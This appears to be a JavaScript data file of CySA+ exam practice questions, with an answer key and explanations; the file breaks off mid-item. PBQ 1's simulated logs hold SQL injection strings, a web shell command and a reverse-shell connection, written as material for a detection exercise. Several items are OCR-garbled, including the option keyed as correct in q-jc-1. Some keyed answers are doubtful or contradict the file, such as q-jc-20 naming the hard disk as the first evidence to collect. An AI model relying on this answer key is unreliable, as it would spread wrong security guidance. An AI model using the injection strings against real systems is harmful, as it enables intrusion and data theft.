// CompTIA CySA+ (CS0-003) Questions
const CYSA_QUESTIONS = [
  {
    "id": "pbq-1",
    "type": "pbq",
    "pbqType": "log-analysis",
    "domain": "Domain 1.0: Security Operations",
    "title": "PBQ 1: SIEM Log Analysis & Threat Identification",
    "scenario": "As a Cybersecurity Analyst, you receive a SIEM alert regarding unusual HTTP requests targeted at an external web server (192.168.10.45). Analyze the web server log entries and select the primary attack vector, compromised endpoint, and immediate mitigation.",
    "logs": [
      "2026-08-14 10:14:02 UTC - Src: 203.0.113.88 -> Dst: 192.168.10.45:80 HTTP GET /products.php?id=101 ' OR '1'='1' -- Status 200",
      "2026-08-14 10:14:05 UTC - Src: 203.0.113.88 -> Dst: 192.168.10.45:80 HTTP GET /products.php?id=101 UNION SELECT username, password_hash FROM users -- Status 200",
      "2026-08-14 10:15:22 UTC - Src: 203.0.113.88 -> Dst: 192.168.10.45:80 HTTP POST /uploads/cmd.php?cmd=whoami Status 200 (www-data)",
      "2026-08-14 10:16:01 UTC - Src: 192.168.10.45 -> Dst: 198.51.100.14:443 Outbound HTTPS Connection Created - Payload: Encrypted reverse shell session"
    ],
    "fields": [
      {
        "id": "attack_vector",
        "label": "Identified Primary Attack Vector:",
        "options": [
          "Cross-Site Scripting (XSS)",
          "SQL Injection leading to Remote Code Execution (RCE)",
          "Server-Side Request Forgery (SSRF)",
          "Credential Stuffing Attack"
        ],
        "correct": "SQL Injection leading to Remote Code Execution (RCE)"
      },
      {
        "id": "target_asset",
        "label": "Compromised Internal IP Address:",
        "options": [
          "203.0.113.88",
          "192.168.10.45",
          "198.51.100.14",
          "192.168.10.1"
        ],
        "correct": "192.168.10.45"
      },
      {
        "id": "mitigation",
        "label": "Immediate Containment Action:",
        "options": [
          "Isolate web server 192.168.10.45 from network and revoke web application DB credentials",
          "Block inbound ICMP traffic on the edge router",
          "Reboot the database host server",
          "Issue a site-wide user password reset notice"
        ],
        "correct": "Isolate web server 192.168.10.45 from network and revoke web application DB credentials"
      }
    ],
    "explanation": "Logs show SQL Injection exploited on /products.php to extract user hashes, followed by uploading cmd.php web shell and initiating an outbound HTTPS reverse shell."
  },
  {
    "id": "pbq-2",
    "type": "pbq",
    "pbqType": "firewall-rules",
    "domain": "Domain 2.0: Vulnerability Management",
    "title": "PBQ 2: Firewall Rule Configuration & Hardening",
    "scenario": "Configure Next-Generation Firewall rules for the DMZ to enforce enterprise security policy: Block unencrypted remote administration and maintain implicit deny stance.",
    "rules": [
      {
        "ruleId": 1,
        "src": "Internet (Any)",
        "dst": "10.0.1.10 (Web)",
        "service": "HTTP (80)",
        "action": "ALLOW"
      },
      {
        "ruleId": 2,
        "src": "Internet (Any)",
        "dst": "10.0.1.10 (Web)",
        "service": "HTTPS (443)",
        "action": "ALLOW"
      },
      {
        "ruleId": 3,
        "src": "Admin Subnet (10.0.99.0/24)",
        "dst": "DMZ Subnet (10.0.1.0/24)",
        "service": "SSH (22)",
        "action": "ALLOW"
      },
      {
        "ruleId": 4,
        "src": "Internet (Any)",
        "dst": "DMZ Subnet (10.0.1.0/24)",
        "service": "Telnet (23)",
        "action": "DENY"
      },
      {
        "ruleId": 5,
        "src": "Any",
        "dst": "Any",
        "service": "Any",
        "action": "DENY"
      }
    ],
    "fields": [
      {
        "id": "unencrypted_mgmt",
        "label": "Insecure Remote Management Protocol to Block:",
        "options": [
          "Telnet (23) & HTTP (80) Management",
          "SSH (22)",
          "HTTPS (443)",
          "SFTP (22)"
        ],
        "correct": "Telnet (23) & HTTP (80) Management"
      },
      {
        "id": "default_action",
        "label": "Recommended Firewall Security Stance at rule tail:",
        "options": [
          "Implicit Deny Any Any",
          "Implicit Allow Any Any",
          "Log and Forward",
          "Stateful Bypass"
        ],
        "correct": "Implicit Deny Any Any"
      }
    ],
    "explanation": "Enterprise security policy mandates blocking unencrypted management interfaces like Telnet (Port 23). The final firewall rule must always be an Implicit Deny statement."
  },
  {
    "id": "pbq-3",
    "type": "pbq",
    "pbqType": "order-matching",
    "domain": "Domain 3.0: Incident Response and Management",
    "title": "PBQ 3: Order of Volatility in Digital Forensics",
    "scenario": "Order the artifacts below from MOST volatile (1) to LEAST volatile (5) according to RFC 3227 standards.",
    "items": [
      "RAM / System Memory",
      "Swap / Page File",
      "Hard Disk / SSD File System Data",
      "Network Routing Table & ARP Cache",
      "Archival Backup Tapes / Offsite Storage"
    ],
    "correctOrder": [
      "Network Routing Table & ARP Cache",
      "RAM / System Memory",
      "Swap / Page File",
      "Hard Disk / SSD File System Data",
      "Archival Backup Tapes / Offsite Storage"
    ],
    "explanation": "RFC 3227 order of volatility: 1. CPU registers & Cache -> 2. Routing table, ARP cache, RAM -> 3. Swap space -> 4. Disk data -> 5. Offsite backups."
  },
  {
    "id": "q-jc-1",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 2.0: Vulnerability Management",
    "question": "A recent zero-day vulnerability is being actively exploited, requires no user interaction or privilege\nescalation, and has a significant impact to confidentiality and integrity but not to availability. Which\nof the following CVE metrics would be most accurate for this zero-day threat?",
    "options": [
      "A. CVSS: 31/AV: N/AC: L/PR: N/UI: N/S: U/C: H/1: K/A: L",
      "B. CVSS:31/AV:K/AC:L/PR:H/UI:R/S:C/C:H/I:H/A:L",
      "C. CVSS:31/AV:N/AC:L/PR:N/UI:H/S:U/C:L/I:N/A:H",
      "D. CVSS:31/AV:L/AC:L/PR:R/UI:R/S:U/C:H/I:L/A:H"
    ],
    "answer": "A",
    "explanation": "This answer matches the description of the zero-day threat. The attack vector is network (AV:N), the\nattack complexity is low (AC:L), no privileges are required (PR:N), no user interaction is required\n(UI:N), the scope is unchanged (S:U), the confidentiality and integrity impacts are high (C:H/I:H), and\nthe availability impact is low (A:L). Official Reference: https://nvd.nist.gov/vuln-metrics/cvss",
    "image": "images/page_3_img_2.jpeg"
  },
  {
    "id": "q-jc-2",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 1.0: Security Operations",
    "question": "Which of the following tools would work best to prevent the exposure of PII outside of an\norganization?",
    "options": [
      "A. PAM",
      "B. IDS",
      "C. PKI",
      "D. DLP"
    ],
    "answer": "D",
    "explanation": "Data loss prevention (DLP) is a tool that can prevent the exposure of PII outside of an organization by\nmonitoring, detecting, and blocking sensitive data in motion, in use, or at rest.",
    "image": "images/page_3_img_2.jpeg"
  },
  {
    "id": "q-jc-3",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 2.0: Vulnerability Management",
    "question": "An organization conducted a web application vulnerability assessment against the corporate website,\nand the following output was observed:\nWhich of the following tuning recommendations should the security analyst share?",
    "options": [
      "A. Set an HttpOnlvflaq to force communication by HTTPS",
      "B. Block requests without an X-Frame-Options header",
      "C. Configure an Access-Control-Allow-Origin header to authorized domains",
      "D. Disable the cross-origin resource sharing header"
    ],
    "answer": "B",
    "explanation": "The output shows that the web application is vulnerable to clickjacking attacks, which allow an\nattacker to overlay a hidden frame on top of a legitimate page and trick users into clicking on\nmalicious links. Blocking requests without an X-Frame-Options header can prevent this attack by\ninstructing the browser to not display the page within a frame.",
    "image": "images/page_3_img_2.jpeg"
  },
  {
    "id": "q-jc-4",
    "type": "mcq",
    "multiSelect": true,
    "selectCount": 2,
    "domain": "Domain 2.0: Vulnerability Management",
    "question": "Which of the following items should be included in a vulnerability scan report? (Choose two.)",
    "options": [
      "A. Lessons learned",
      "B. Service-level agreement",
      "C. Playbook",
      "D. Affected hosts",
      "E. Risk score",
      "F. Education plan"
    ],
    "answer": [
      "D",
      "E"
    ],
    "explanation": "A vulnerability scan report should include information about the affected hosts, such as their IP\naddresses, hostnames, operating systems, and services. It should also include a risk score for each\nvulnerability, which indicates the severity and potential impact of the vulnerability on the host and\nthe organization. Official Reference: https://www.first.org/cvss/",
    "image": "images/page_3_img_2.jpeg"
  },
  {
    "id": "q-jc-5",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 2.0: Vulnerability Management",
    "question": "The Chief Executive Officer of an organization recently heard that exploitation of new attacks in the\nindustry was happening approximately 45 days after a patch was released. Which of the following\nwould best protect this organization?",
    "options": [
      "A. A mean time to remediate of 30 days",
      "B. A mean time to detect of 45 days",
      "C. A mean time to respond of 15 days",
      "D. Third-party application testing"
    ],
    "answer": "A",
    "explanation": "A mean time to remediate (MTTR) is a metric that measures how long it takes to fix a vulnerability\nafter it is discovered. A MTTR of 30 days would best protect the organization from the new attacks\nthat are exploited 45 days after a patch is released, as it would ensure that the vulnerabilities are\nfixed before they are exploited",
    "image": null
  },
  {
    "id": "q-jc-6",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 1.0: Security Operations",
    "question": "A security analyst recently joined the team and is trying to determine which scripting language is\nbeing used in a production script to determine if it is malicious. Given the following script:\nWhich of the following scripting languages was used in the script?",
    "options": [
      "A. PowerShel",
      "B. Ruby",
      "C. Python",
      "D. Shell script"
    ],
    "answer": "A",
    "explanation": "The script uses PowerShell syntax, such as cmdlets, parameters, variables, and comments.\nPowerShell is a scripting language that can be used to automate tasks and manage systems.",
    "image": null
  },
  {
    "id": "q-jc-7",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 4.0: Reporting and Communication",
    "question": "A company's user accounts have been compromised. Users are also reporting that the company's\ninternal portal is sometimes only accessible through HTTP, other times; it is accessible through\nHTTPS. Which of the following most likely describes the observed activity?",
    "options": [
      "A. There is an issue with the SSL certificate causinq port 443 to become unavailable for HTTPS access",
      "B. An on-path attack is being performed by someone with internal access that forces users into port\n80",
      "C. The web server cannot handle an increasing amount of HTTPS requests so it forwards users to\nport 80",
      "D. An error was caused by BGP due to new rules applied over the company's internal routers"
    ],
    "answer": "B",
    "explanation": "An on-path attack is a type of man-in-the-middle attack where an attacker intercepts and modifies\nnetwork traffic between two parties. In this case, someone with internal access may be performing\nan on-path attack by forcing users into port 80, which is used for HTTP communication, instead of\nport 443, which is used for HTTPS communication. This would allow the attacker to compromise the\nuser accounts and access the company’s internal portal.",
    "image": "images/page_6_img_3.jpeg"
  },
  {
    "id": "q-jc-9",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 2.0: Vulnerability Management",
    "question": "Which of the following will most likely ensure that mission-critical services are available in the event\nof an incident?",
    "options": [
      "A. Business continuity plan",
      "B. Vulnerability management plan",
      "C. Disaster recovery plan",
      "D. Asset management plan"
    ],
    "answer": "A",
    "explanation": "A Business Continuity Plan (BCP) is specifically designed to ensure that mission-critical services remain AVAILABLE and operational during an incident or disruption. It defines procedures, alternate sites, failover strategies, and resource priorities to keep the business running. A Disaster Recovery Plan (DRP) focuses on restoring IT systems AFTER a disaster has occurred, not maintaining availability during one. Vulnerability management and asset management plans do not directly address service availability during incidents.",
    "image": "images/page_6_img_3.jpeg"
  },
  {
    "id": "q-jc-10",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 1.0: Security Operations",
    "question": "The Chief Information Security Officer wants to eliminate and reduce shadow IT in the enterprise.\nSeveral high-risk cloud applications are used that increase the risk to the organization. Which of the\nfollowing solutions will assist in reducing the risk?",
    "options": [
      "A. Deploy a CASB and enable policy enforcement",
      "B. Configure MFA with strict access",
      "C. Deploy an API gateway",
      "D. Enable SSO to the cloud applications"
    ],
    "answer": "A",
    "explanation": "A cloud access security broker (CASB) is a tool that can help reduce the risk of shadow IT in the\nenterprise by providing visibility and control over cloud applications and services. A CASB can enable\npolicy enforcement by blocking unauthorized or risky cloud applications, enforcing data loss\nprevention rules, encrypting sensitive data, and detecting anomalous user behavior.",
    "image": null
  },
  {
    "id": "q-jc-11",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 2.0: Vulnerability Management",
    "question": "An incident response team receives an alert to start an investigation of an internet outage. The\noutage is preventing all users in multiple locations from accessing external SaaS resources. The team\ndetermines the organization was impacted by a DDoS attack. Which of the following logs should the\nteam review first?",
    "options": [
      "A. CDN",
      "B. Vulnerability scanner",
      "C. DNS",
      "D. Web server"
    ],
    "answer": "C",
    "explanation": "A distributed denial-of-service (DDoS) attack is a type of cyberattack that aims to overwhelm a\ntarget’s network or server with a large volume of traffic from multiple sources. A common technique\nfor launching a DDoS attack is to compromise DNS servers, which are responsible for resolving\ndomain names into IP addresses. By flooding DNS servers with malicious requests, attackers can\ndisrupt the normal functioning of the internet and prevent users from accessing external SaaS\nresources. Official Reference: https://www.eccouncil.org/cybersecurity-exchange/threat-\nintelligence/cyber-kill-chain-seven-steps-cyberattack/",
    "image": null
  },
  {
    "id": "q-jc-12",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 1.0: Security Operations",
    "question": "A malicious actor has gained access to an internal network by means of social engineering. The actor\ndoes not want to lose access in order to continue the attack. Which of the following best describes\nthe current stage of the Cyber Kill Chain that the threat actor is currently operating in?",
    "options": [
      "A. Weaponization",
      "B. Reconnaissance",
      "C. Delivery",
      "D. Exploitation"
    ],
    "answer": "D",
    "explanation": "The Cyber Kill Chain is a framework that describes the stages of a cyberattack from reconnaissance to\nactions on objectives. The exploitation stage is where attackers take advantage of the vulnerabilities\nthey have discovered in previous stages to further infiltrate a target’s network and achieve their\nobjectives. In this case, the malicious actor has gained access to an internal network by means of\nsocial engineering and does not want to lose access in order to continue the attack. This indicates\nthat the actor is in the exploitation stage of the Cyber Kill Chain. Official Reference:\nhttps://www.lockheedmartin.com/en-us/capabilities/cyber/cyber-kill-chain.html",
    "image": null
  },
  {
    "id": "q-jc-13",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 2.0: Vulnerability Management",
    "question": "An analyst finds that an IP address outside of the company network that is being used to run network\nand vulnerability scans across external-facing assets. Which of the following steps of an attack\nframework is the analyst witnessing?",
    "options": [
      "A. Exploitation",
      "B. Reconnaissance",
      "C. Command and control",
      "D. Actions on objectives"
    ],
    "answer": "B",
    "explanation": "Reconnaissance is the first stage in the Cyber Kill Chain and involves researching potential targets\nbefore carrying out any penetration testing. The reconnaissance stage may include identifying\npotential targets, finding their vulnerabilities, discovering which third parties are connected to them\n(and what data they can access), and exploring existing entry points as well as finding new ones.\nReconnaissance can take place both online and offline. In this case, an analyst finds that an IP\naddress outside of the company network is being used to run network and vulnerability scans across\nexternal-facing assets. This indicates that the analyst is witnessing reconnaissance activity by an\nattacker. Official Reference: https://www.lockheedmartin.com/en-us/capabilities/cyber/cyber-kill-\nchain.html",
    "image": null
  },
  {
    "id": "q-jc-14",
    "type": "mcq",
    "multiSelect": true,
    "selectCount": 2,
    "domain": "Domain 3.0: Incident Response and Management",
    "question": "An incident response analyst notices multiple emails traversing the network that target only the\nadministrators of the company. The email contains a concealed URL that leads to an unknown\nwebsite in another country. Which of the following best describes what is happening? (Choose two.)",
    "options": [
      "A. Beaconinq",
      "B. Domain Name System hijacking",
      "C. Social engineering attack",
      "D. On-path attack",
      "E. Obfuscated links",
      "F. Address Resolution Protocol poisoning"
    ],
    "answer": [
      "C",
      "E"
    ],
    "explanation": "A social engineering attack is a type of cyberattack that relies on manipulating human psychology\nrather than exploiting technical vulnerabilities. A social engineering attack may involve deceiving,\npersuading, or coercing users into performing actions that benefit the attacker, such as clicking on\nmalicious links, divulging sensitive information, or granting access to restricted resources. An\nobfuscated link is a link that has been disguised or altered to hide its true destination or purpose.\nObfuscated links are often used by attackers to trick users into visiting malicious websites or\ndownloading malware. In this case, an incident response analyst notices multiple emails traversing\nthe network that target only the administrators of the company. The email contains a concealed URL\nthat leads to an unknown website in another country. This indicates that the analyst is witnessing a\nsocial engineering attack using obfuscated links.",
    "image": "images/page_10_img_2.jpeg"
  },
  {
    "id": "q-jc-15",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 2.0: Vulnerability Management",
    "question": "During security scanning, a security analyst regularly finds the same vulnerabilities in a critical\napplication. Which of the following recommendations would best mitigate this problem if applied\nalong the SDLC phase?",
    "options": [
      "A. Conduct regular red team exercises over the application in production",
      "B. Ensure that all implemented coding libraries are regularly checked",
      "C. Use application security scanning as part of the pipeline for the CI/CDflow",
      "D. Implement proper input validation for any data entry form"
    ],
    "answer": "C",
    "explanation": "Application security scanning is a process that involves testing and analyzing applications for security\nvulnerabilities, such as injection flaws, broken authentication, cross-site scripting, and insecure\nconfiguration. Application security scanning can help identify and fix security issues before they\nbecome exploitable by attackers. Using application security scanning as part of the pipeline for the\ncontinuous integration/continuous delivery (CI/CD) flow can help mitigate the problem of finding the\nsame vulnerabilities in a critical application during security scanning. This is because application\nsecurity scanning can be integrated into the development lifecycle and performed automatically and\nfrequently as part of the CI/CD process.",
    "image": "images/page_10_img_2.jpeg"
  },
  {
    "id": "q-jc-16",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 2.0: Vulnerability Management",
    "question": "An analyst is reviewing a vulnerability report and must make recommendations to the executive\nteam. The analyst finds that most systems can be upgraded with a reboot resulting in a single\ndowntime window. However, two of the critical systems cannot be upgraded due to a vendor\nappliance that the company does not have access to. Which of the following inhibitors to\nremediation do these systems and associated vulnerabilities best represent?",
    "options": [
      "A. Proprietary systems",
      "B. Legacy systems",
      "C. Unsupported operating systems",
      "D. Lack of maintenance windows"
    ],
    "answer": "A",
    "explanation": "Proprietary systems are systems that are owned and controlled by a specific vendor or manufacturer,\nand that use proprietary standards or protocols that are not compatible with other systems.\nProprietary systems can pose a challenge for vulnerability management, as they may not allow users\nto access or modify their configuration, update their software, or patch their vulnerabilities. In this\ncase, two of the critical systems cannot be upgraded due to a vendor appliance that the company\ndoes not have access to. This indicates that these systems and associated vulnerabilities are\nexamples of proprietary systems as inhibitors to remediation",
    "image": "images/page_10_img_2.jpeg"
  },
  {
    "id": "q-jc-17",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 2.0: Vulnerability Management",
    "question": "The security team reviews a web server for XSS and runs the following Nmap scan:\nWhich of the following most accurately describes the result of the scan?",
    "options": [
      "A. An output of characters > and \" as the parameters used m the attempt",
      "B. The vulnerable parameter ID hccp://l72.31.15.2/1.php?id-2 and unfiltered characters returned",
      "C. The vulnerable parameter and unfiltered or encoded characters passed > and \" as unsafe",
      "D. The vulnerable parameter and characters > and \" with a reflected XSS attempt"
    ],
    "answer": "D",
    "explanation": "A cross-site scripting (XSS) attack is a type of web application attack that injects malicious code into a\nweb page that is then executed by the browser of a victim user. A reflected XSS attack is a type of XSS\nattack where the malicious code is embedded in a URL or a form parameter that is sent to the web\nserver and then reflected back to the user’s browser. In this case, the Nmap scan shows that the web\nserver is vulnerable to a reflected XSS attack, as it returns the characters > and \" without any filtering\nor encoding. The vulnerable parameter is id in the URL http://172.31.15.2/1.php?id=2.",
    "image": "images/page_10_img_2.jpeg"
  },
  {
    "id": "q-jc-18",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 3.0: Incident Response and Management",
    "question": "Which of the following is the best action to take after the conclusion of a security incident to improve\nincident response in the future?",
    "options": [
      "A. Develop a call tree to inform impacted users",
      "B. Schedule a review with all teams to discuss what occurred",
      "C. Create an executive summary to update company leadership",
      "D. Review regulatory compliance with public relations for official notification"
    ],
    "answer": "B",
    "explanation": "One of the best actions to take after the conclusion of a security incident to improve incident\nresponse in the future is to schedule a review with all teams to discuss what occurred, what went\nwell, what went wrong, and what can be improved. This review is also known as a lessons learned\nsession or an after-action report. The purpose of this review is to identify the root causes of the\nincident, evaluate the effectiveness of the incident response process, document any gaps or\nweaknesses in the security controls, and recommend corrective actions or preventive measures for\nfuture incidents. Official Reference: https://www.eccouncil.org/cybersecurity-exchange/threat-\nintelligence/cyber-kill-chain-seven-steps-cyberattack/",
    "image": null
  },
  {
    "id": "q-jc-19",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 1.0: Security Operations",
    "question": "A security analyst received a malicious binary file to analyze. Which of the following is the best\ntechnique to perform the analysis?",
    "options": [
      "A. Code analysis",
      "B. Static analysis",
      "C. Reverse engineering",
      "D. Fuzzing"
    ],
    "answer": "C",
    "explanation": "Reverse engineering is a technique that involves analyzing a binary file to understand its structure,\nfunctionality, and behavior. Reverse engineering can help security analysts perform malware\nanalysis, vulnerability research, exploit development, and software debugging. Reverse engineering\ncan be done using various tools, such as disassemblers, debuggers, decompilers, and hex editors.",
    "image": null
  },
  {
    "id": "q-jc-20",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 3.0: Incident Response and Management",
    "question": "An incident response team found IoCs in a critical server. The team needs to isolate and collect\ntechnical evidence for further investigation. Which of the following pieces of data should be\ncollected first in order to preserve sensitive information before isolating the server?",
    "options": [
      "A. Hard disk",
      "B. Primary boot partition",
      "C. Malicious tiles",
      "D. Routing table",
      "E. Static IP address"
    ],
    "answer": "A",
    "explanation": "The hard disk is the piece of data that should be collected first in order to preserve sensitive\ninformation before isolating the server. The hard disk contains all the files and data stored on the\nserver, which may include evidence of malicious activity, such as malware installation, data\nexfiltration, or configuration changes. The hard disk should be collected using proper forensic\ntechniques, such as creating an image or a copy of the disk and maintaining its integrity using\nhashing algorithms.",
    "image": null
  },
  {
    "id": "q-jc-21",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 4.0: Reporting and Communication",
    "question": "Which of the following security operations tasks are ideal for automation?",
    "options": [
      "A. Suspicious file analysis:\nLook for suspicious-looking graphics in a folder.\nCreate subfolders in the original folder based on category of graphics found.\nMove the suspicious graphics to the appropriate subfolder",
      "B. Firewall IoC block actions:\nExamine the firewall logs for IoCs from the most recently published zero-day exploit\nTake mitigating actions in the firewall to block the behavior found in the logs\nFollow up on any false positives that were caused by the block rules",
      "C. Security application user errors:\nSearch the error logs for signs of users having trouble with the security application\nLook up the user's phone number\nCall the user to help with any questions about using the application",
      "D. Email header analysis:\nCheck the email header for a phishing confidence metric greater than or equal to five\nAdd the domain of sender to the block list\nMove the email to quarantine"
    ],
    "answer": "D",
    "explanation": "Email header analysis is one of the security operations tasks that are ideal for automation. Email\nheader analysis involves checking the email header for various indicators of phishing or spamming\nattempts, such as sender address spoofing, mismatched domains, suspicious subject lines, or\nphishing confidence metrics. Email header analysis can be automated using tools or scripts that can\nparse and analyze email headers and take appropriate actions based on predefined rules or\nthresholds",
    "image": null
  },
  {
    "id": "q-jc-22",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 4.0: Reporting and Communication",
    "question": "An organization has experienced a breach of customer transactions. Under the terms of PCI DSS,\nwhich of the following groups should the organization report the breach to?",
    "options": [
      "A. PCI Security Standards Council",
      "B. Local law enforcement",
      "C. Federal law enforcement",
      "D. Card issuer"
    ],
    "answer": "D",
    "explanation": "Under the terms of PCI DSS, an organization that has experienced a breach of customer transactions\nshould report the breach to the card issuer. The card issuer is the financial institution that issues the\npayment cards to the customers and that is responsible for authorizing and processing the\ntransactions. The card issuer may have specific reporting requirements and procedures for the\norganization to follow in the event of a breach. The organization should also notify other parties that\nmay be affected by the breach, such as customers, law enforcement, or regulators, depending on the\nnature and scope of the breach. Official Reference: https://www.pcisecuritystandards.org/",
    "image": null
  },
  {
    "id": "q-jc-23",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 4.0: Reporting and Communication",
    "question": "Which of the following is the best metric for an organization to focus on given recent investments in\nSIEM, SOAR, and a ticketing system?",
    "options": [
      "A. Mean time to detect",
      "B. Number of exploits by tactic",
      "C. Alert volume",
      "D. Quantity of intrusion attempts"
    ],
    "answer": "A",
    "explanation": "Mean time to detect (MTTD) is the best metric for an organization to focus on given recent\ninvestments in SIEM, SOAR, and a ticketing system. MTTD is a metric that measures how long it takes\nto detect a security incident or threat from the time it occurs. MTTD can be improved by using tools\nand processes that can collect, correlate, analyze, and alert on security data from various sources.\nSIEM, SOAR, and ticketing systems are examples of such tools and processes that can help reduce\nMTTD and enhance security operations. Official Reference: https://www.eccouncil.org/cybersecurity-\nexchange/threat-intelligence/cyber-kill-chain-seven-steps-cyberattack",
    "image": null
  },
  {
    "id": "q-jc-24",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 2.0: Vulnerability Management",
    "question": "A company is implementing a vulnerability management program and moving from an on-premises\nenvironment to a hybrid IaaS cloud environment. Which of the following implications should be\nconsidered on the new hybrid environment?",
    "options": [
      "A. The current scanners should be migrated to the cloud",
      "B. Cloud-specific misconfigurations may not be detected by the current scanners",
      "C. Existing vulnerability scanners cannot scan laaS systems",
      "D. Vulnerability scans on cloud environments should be performed from the cloud"
    ],
    "answer": "B",
    "explanation": "Cloud-specific misconfigurations are security issues that arise from improper or inadequate\nconfiguration of cloud resources, such as storage buckets, databases, virtual machines, or containers.\nCloud-specific misconfigurations may not be detected by the current scanners that are designed for\non-premises environments, as they may not have the visibility or access to the cloud resources or the\ncloud provider’s APIs. Therefore, one of the implications that should be considered on the new\nhybrid environment is that cloud-specific misconfigurations may not be detected by the current\nscanners.",
    "image": null
  },
  {
    "id": "q-jc-25",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 3.0: Incident Response and Management",
    "question": "A security alert was triggered when an end user tried to access a website that is not allowed per\norganizational policy. Since the action is considered a terminable offense, the SOC analyst collects\nthe authentication logs, web logs, and temporary files, reflecting the web searches from the user's\nworkstation, to build the case for the investigation. Which of the following is the best way to ensure\nthat the investigation complies with HR or privacy policies?",
    "options": [
      "A. Create a timeline of events detailinq the date stamps, user account hostname and IP information\nassociated with the activities",
      "B. Ensure that the case details do not reflect any user-identifiable information Password protect the\nevidence and restrict access to personnel related to the investigation",
      "C. Create a code name for the investigation in the ticketing system so that all personnel with access\nwill not be able to easily identity the case as an HR-related investigation",
      "D. Notify the SOC manager for awareness after confirmation that the activity was intentional"
    ],
    "answer": "B",
    "explanation": "The best way to ensure that the investigation complies with HR or privacy policies is to ensure that\nthe case details do not reflect any user-identifiable information, such as name, email address, phone\nnumber, or employee ID. This can help protect the privacy and confidentiality of the user and prevent\nany potential discrimination or retaliation. Additionally, password protecting the evidence and\nrestricting access to personnel related to the investigation can help preserve the integrity and\nsecurity of the evidence and prevent any unauthorized or accidental disclosure or modification.",
    "image": null
  },
  {
    "id": "q-jc-26",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 1.0: Security Operations",
    "question": "Which of the following is the first step that should be performed when establishing a disaster\nrecovery plan?",
    "options": [
      "A. Agree on the goals and objectives of the plan",
      "B. Determine the site to be used during a disaster",
      "C. Demonstrate adherence to a standard disaster recovery process",
      "D. Identity applications to be run during a disaster"
    ],
    "answer": "A",
    "explanation": "The first step that should be performed when establishing a disaster recovery plan is to agree on the\ngoals and objectives of the plan. The goals and objectives of the plan should define what the plan\naims to achieve, such as minimizing downtime, restoring critical functions, ensuring data integrity, or\nmeeting compliance requirements. The goals and objectives of the plan should also be aligned with\nthe business needs and priorities of the organization and be measurable and achievable.",
    "image": "images/page_16_img_2.jpeg"
  },
  {
    "id": "q-jc-27",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 2.0: Vulnerability Management",
    "question": "A technician identifies a vulnerability on a server and applies a software patch. Which of the\nfollowing should be the next step in the remediation process?",
    "options": [
      "A. Testing",
      "B. Implementation",
      "C. Validation",
      "D. Rollback"
    ],
    "answer": "C",
    "explanation": "The next step in the remediation process after applying a software patch is validation. Validation is a\nprocess that involves verifying that the patch has been successfully applied, that it has fixed the\nvulnerability, and that it has not caused any adverse effects on the system or application functionality\nor performance. Validation can be done using various methods, such as scanning, testing,\nmonitoring, or auditing.",
    "image": "images/page_16_img_2.jpeg"
  },
  {
    "id": "q-jc-28",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 1.0: Security Operations",
    "question": "The analyst reviews the following endpoint log entry:\nWhich of the following has occurred?",
    "options": [
      "A. Registry change",
      "B. Rename computer",
      "C. New account introduced",
      "D. Privilege escalation"
    ],
    "answer": "C",
    "explanation": "The endpoint log entry shows that a new account named “admin” has been created on a Windows\nsystem with a local group membership of “Administrators”. This indicates that a new account has\nbeen introduced on the system with administrative privileges. This could be a sign of malicious\nactivity, such as privilege escalation or backdoor creation, by an attacker who has compromised the\nsystem.",
    "image": "images/page_16_img_2.jpeg"
  },
  {
    "id": "q-jc-29",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 3.0: Incident Response and Management",
    "question": "A security program was able to achieve a 30% improvement in MTTR by integrating security controls\ninto a SIEM. The analyst no longer had to jump between tools. Which of the following best describes\nwhat the security program did?",
    "options": [
      "A. Data enrichment",
      "B. Security control plane",
      "C. Threat feed combination",
      "D. Single pane of glass"
    ],
    "answer": "D",
    "explanation": "A single pane of glass is a term that describes a unified view or interface that integrates multiple\ntools or data sources into one dashboard or console. A single pane of glass can help improve security\noperations by providing visibility, correlation, analysis, and alerting capabilities across various\nsecurity controls and systems. A single pane of glass can also help reduce complexity, improve\nefficiency, and enhance decision making for security analysts. In this case, a security program was\nable to achieve a 30% improvement in MTTR by integrating security controls into a SIEM, which\nprovides a single pane of glass for security operations. Official Reference:\nhttps://www.eccouncil.org/cybersecurity-exchange/threat-intelligence/cyber-kill-chain-seven-steps-\ncyberattack",
    "image": "images/page_16_img_2.jpeg"
  },
  {
    "id": "q-jc-30",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 2.0: Vulnerability Management",
